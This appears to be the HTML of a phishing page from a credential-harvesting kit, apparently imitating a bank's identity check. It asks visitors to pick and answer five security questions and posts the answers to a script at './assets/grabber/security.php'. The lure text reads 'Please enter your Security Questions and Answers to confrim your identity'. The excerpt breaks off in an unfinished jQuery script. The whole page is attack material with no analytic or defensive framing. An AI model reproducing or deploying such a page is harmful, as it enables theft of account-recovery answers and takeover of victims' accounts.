  ...
  <header class="header-container">
              ...
              <div class="col-main-right">
                ...
                <div class="row">
                  <div class="col-sm-7">
                    ...
                    <form method="post" id="aoblogon" name="aoblogon" action="./assets/grabber/security.php">
                      <div>
                        <p style="padding-left:12px;"> 
                          Please enter your Security Questions and Answers to confrim your identity.
                        </p>

                        <div data-role="fieldcontain" class="col-sm-12 form-group control-group required" id="aoblogon_userid_container">
                          <div class="controls">
                            <div>
                              <select class="form-control" type="text" id="question1" name="question1" required="true">
                                <option value=""  selected="selected">--Choose Security Question--</option>
                            ...
                            <br />
                            <input class="form-control inputbox required" type="text" id="aoblogon_userid" name="answer1" autocomplete="off" autocapitalize="none" required="required" autofocus="autofocus" value="">
                          </div>
                        </div>
                        ...
                        <div data-role="fieldcontain" class="col-sm-12 form-group control-group required" id="aoblogon_userid_container">
                          <div class="controls">
                            <div>
                              <select class="form-control" type="text" id="question2" name="question2" required="true">
                                <option value=""  selected="selected">--Choose Security Question--</option>
                                <option>What was the name of your first pet?</option>
                                <option>What is the first name of the best man/maid of honor at your wedding?</option>
                                <option>In what city did you meet your spouse/significant other?</option>
                            ...
                            <br />
                            <input class="form-control inputbox required" type="text" id="aoblogon_userid" name="answer2" autocomplete="off" autocapitalize="none" required="required" autofocus="autofocus" value="">
                          </div>
                        </div>
                        ...
                        <div data-role="fieldcontain" class="col-sm-12 form-group control-group required" id="aoblogon_userid_container">
                          ...
                          <div class="controls">
                            <div>
                              <select class="form-control" type="text" id="question3" name="question3" required="true">
                                <option value=""  selected="selected">--Choose Security Question--</option>
								<option>What is the name of the first company you worked for?</option>
                                <option>What was the name of your first pet?</option>
                                <option>What is the first name of the best man/maid of honor at your wedding?</option>
                            ...
                            <br />
                            <input class="form-control inputbox required" type="text" id="aoblogon_userid" name="answer3" autocomplete="off" autocapitalize="none" required="required" autofocus="autofocus" value="">
                          </div>
                        </div>
						...
						<div data-role="fieldcontain" class="col-sm-12 form-group control-group required" id="aoblogon_userid_container">
                          ...
                          <div class="controls">
                            <div>
                              <select class="form-control" type="text" id="question4" name="question4" required="true">
                                <option value=""  selected="selected">--Choose Security Question--</option>
								<option>What is the name of the first company you worked for?</option>
                                <option>What was the name of your first pet?</option>
                                <option>What is the first name of the best man/maid of honor at your wedding?</option>
                            ...
                            <br />
                            <input class="form-control inputbox required" type="text" id="aoblogon_userid" name="answer4" autocomplete="off" autocapitalize="none" required="required" autofocus="autofocus" value="">
                          </div>
                        </div>
						...
						<div data-role="fieldcontain" class="col-sm-12 form-group control-group required" id="aoblogon_userid_container">
                          ...
                          <div class="controls">
                            <div>
                              <select class="form-control" type="text" id="question5" name="question5" required="true">
                                <option value=""  selected="selected">--Choose Security Question--</option>
								<option>What is the name of the first company you worked for?</option>
                                <option>What was the name of your first pet?</option>
                                <option>What is the first name of the best man/maid of honor at your wedding?</option>
                            ...
                            <br />
                            <input class="form-control inputbox required" type="text" id="aoblogon_userid" name="answer5" autocomplete="off" autocapitalize="none" required="required" autofocus="autofocus" value="">
                          </div>
                        </div>
    ...
    <script>
      $(document).ready(function () {
        var $input = $('#answer1, #answer2, #answer3, #answer4, #answer5'),
